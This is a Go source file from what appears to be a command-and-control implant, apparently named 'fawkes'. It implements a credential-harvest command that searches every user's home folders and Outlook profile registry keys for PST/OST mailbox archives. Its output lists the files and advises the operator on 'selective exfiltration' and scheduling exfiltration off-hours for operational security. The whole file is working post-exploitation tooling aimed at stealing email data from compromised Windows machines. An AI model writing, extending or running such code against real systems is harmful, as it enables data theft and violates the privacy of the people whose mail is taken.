//go:build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

func credPST(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("Outlook PST/OST File Discovery\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	homes := getUserHomes(args.User)
	var found []pstFileInfo

	for _, home := range homes {
		user := filepath.Base(home)
		outlookPaths := []string{
			filepath.Join(home, "Documents", "Outlook Files"),
			filepath.Join(home, "AppData", "Local", "Microsoft", "Outlook"),
		}
		for _, dir := range outlookPaths {
			files := findPSTFiles(dir)
			for i := range files {
				files[i].User = user
				files[i].Source = "default path"
			}
			found = append(found, files...)
		}
	}

	regFiles := discoverPSTFromRegistry(homes)
	found = append(found, regFiles...)

	for _, home := range homes {
		user := filepath.Base(home)
		roamingDir := filepath.Join(home, "AppData", "Roaming", "Microsoft", "Outlook")
		files := findPSTFiles(roamingDir)
		for i := range files {
			files[i].User = user
			files[i].Source = "roaming"
		}
		found = append(found, files...)
	}

	found = deduplicatePSTFiles(found)

	if len(found) == 0 {
		sb.WriteString("  (no PST/OST files found)\n")
		return successResult(sb.String())
	}

	sb.WriteString(fmt.Sprintf("[+] Found %d PST/OST file(s):\n\n", len(found)))
	for i, f := range found {
		sb.WriteString(fmt.Sprintf("  [%d] %s\n", i+1, f.Path))
		sb.WriteString(fmt.Sprintf("      Type:     %s\n", f.Type))
		sb.WriteString(fmt.Sprintf("      Size:     %s (%d bytes)\n", formatSize(f.Size), f.Size))
		sb.WriteString(fmt.Sprintf("      Modified: %s\n", f.Modified.Format("2006-01-02 15:04:05")))
		sb.WriteString(fmt.Sprintf("      User:     %s\n", f.User))
		sb.WriteString(fmt.Sprintf("      Source:   %s\n", f.Source))
		if f.Profile != "" {
			sb.WriteString(fmt.Sprintf("      Profile:  %s\n", f.Profile))
		}
		if f.Locked {
			sb.WriteString("      Status:   LOCKED (Outlook may be running)\n")
		}
		sb.WriteString("\n")
	}

	sb.WriteString("[*] To download: use 'download -path <filepath>' for selective exfiltration\n")
	sb.WriteString("[*] OPSEC: PST files can be large (100MB-10GB+). Consider off-hours exfiltration.\n")

	return successResult(sb.String())
}

func discoverPSTFromRegistry(homes []string) []pstFileInfo {
	var results []pstFileInfo

	for _, home := range homes {
		user := filepath.Base(home)

		for _, ver := range []string{"16.0", "15.0", "14.0"} {
			profilesPath := fmt.Sprintf(`Software\Microsoft\Office\%s\Outlook\Profiles`, ver)
			profilesKey, err := registry.OpenKey(registry.CURRENT_USER, profilesPath, registry.READ)
			if err != nil {
				continue
			}

			profiles, err := profilesKey.ReadSubKeyNames(-1)
			profilesKey.Close()
			if err != nil {
				continue
			}

			for _, profile := range profiles {
				pstFiles := discoverPSTInProfile(profilesPath, profile, user)
				results = append(results, pstFiles...)
			}
		}
	}

	return results
}

func discoverPSTInProfile(profilesPath, profileName, user string) []pstFileInfo {
	var results []pstFileInfo
	profilePath := profilesPath + `\` + profileName
	walkRegistryForPST(profilePath, profileName, user, &results, 0)
	return results
}

func walkRegistryForPST(keyPath, profileName, user string, results *[]pstFileInfo, depth int) {
	if depth > 5 {
		return
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.READ)
	if err != nil {
		return
	}
	defer key.Close()

	for _, valName := range []string{"001f6700", "001e6700", "001f6610", "001e6610"} {
		val, _, err := key.GetStringValue(valName)
		if err != nil || val == "" {
			continue
		}
		val = strings.TrimRight(val, "\x00")
		if val == "" {
			continue
		}
		ext := strings.ToLower(filepath.Ext(val))
		if ext != ".pst" && ext != ".ost" {
			continue
		}

		fi, err := os.Stat(val)
		if err != nil {
			continue
		}

		fileType := "PST"
		if ext == ".ost" {
			fileType = "OST"
		}

		*results = append(*results, pstFileInfo{
			Path:     val,
			Type:     fileType,
			Size:     fi.Size(),
			Modified: fi.ModTime(),
			User:     user,
			Source:   "registry",
			Profile:  profileName,
			Locked:   isFileLocked(val),
		})
	}

	subKeys, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return
	}
	for _, sub := range subKeys {
		walkRegistryForPST(keyPath+`\`+sub, profileName, user, results, depth+1)
	}
}
